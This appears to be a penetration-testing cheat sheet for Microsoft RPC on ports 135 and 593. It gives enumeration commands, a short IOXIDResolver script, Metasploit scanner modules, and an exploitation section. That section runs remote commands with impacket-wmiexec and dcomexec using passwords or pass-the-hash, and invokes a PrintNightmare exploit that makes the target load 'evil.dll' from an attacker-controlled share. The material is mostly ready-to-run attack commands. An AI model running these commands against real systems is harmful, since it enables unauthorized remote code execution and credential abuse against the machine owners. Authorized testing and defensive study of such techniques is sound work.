# Port 135, 593 - MSRPC

## Table of Contents
- [Enumeration](#enumeration)
- [RPC Endpoints](#rpc-endpoints)
- [Exploitation](#exploitation)

---

## Enumeration

### Quick Check (One-liner)

```shell
# Nmap all RPC scripts
nmap -p 135,593 --script "msrpc-enum,rpc-grind" -sV $rhost

# Dump RPC endpoints
impacket-rpcdump $rhost 2>/dev/null | head -50
```

### Network Interface Discovery (One-liner)

```shell
# IOXIDResolver - find hidden interfaces
impacket-rpcmap ncacn_ip_tcp:$rhost 2>/dev/null | grep -i address
```

---

## RPC Endpoints

### Common Endpoints

| Port | Service | Description |
| :--- | :--- | :--- |
| 135 | MSRPC | Microsoft RPC Locator |
| 593 | HTTP-RPC | RPC over HTTP |
| 49152-65535 | Dynamic | RPC dynamic ports |

### IOXIDResolver - Network Interface Enumeration

```shell
# Using Impacket
impacket-rpcmap 'ncacn_ip_tcp:$rhost'

# Python script for hidden interfaces
python3 IOXIDResolver.py -t $rhost
```

#### IOXIDResolver.py

```python
#!/usr/bin/env python3
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.dcomrt import IObjectExporter
import sys

target = sys.argv[1]
stringBinding = f'ncacn_ip_tcp:{target}[135]'
rpctransport = transport.DCERPCTransportFactory(stringBinding)
dce = rpctransport.get_dce_rpc()
dce.connect()

objExporter = IObjectExporter(dce)
bindings = objExporter.ServerAlive2()

for binding in bindings:
    apts = binding['aNetworkAddr']
    print(f"[*] Address: {apts}")
```

---

## Exploitation

### WMI via DCOM

```shell
# Execute commands via WMI
impacket-wmiexec $domain/$user:$password@$rhost

# With hash
impacket-wmiexec $domain/$user@$rhost -hashes :$hash
```

### DCOM Execution

```shell
# Using Impacket dcomexec
impacket-dcomexec $domain/$user:$password@$rhost

# MMC20.Application method
impacket-dcomexec -object MMC20 $domain/$user:$password@$rhost
```

### Metasploit

```shell
# Endpoint mapper
use auxiliary/scanner/dcerpc/endpoint_mapper
set RHOSTS $rhost
run

# Hidden interface enumeration
use auxiliary/scanner/dcerpc/hidden
set RHOSTS $rhost
run

# Management interfaces
use auxiliary/scanner/dcerpc/management
set RHOSTS $rhost
run
```

### PrintNightmare (CVE-2021-34527)

```shell
# Check vulnerability
impacket-rpcdump $rhost | grep -i print

# Exploit
python3 CVE-2021-1675.py $domain/$user:$password@$rhost '\\$lhost\share\evil.dll'
```

---

## Quick Reference

| Tool | Command | Description |
| :--- | :--- | :--- |
| rpcdump | `impacket-rpcdump $rhost` | List RPC endpoints |
| wmiexec | `impacket-wmiexec user:pass@$rhost` | WMI execution |
| dcomexec | `impacket-dcomexec user:pass@$rhost` | DCOM execution |
| Nmap | `nmap -p 135 --script "msrpc-enum" $rhost` | RPC enumeration |
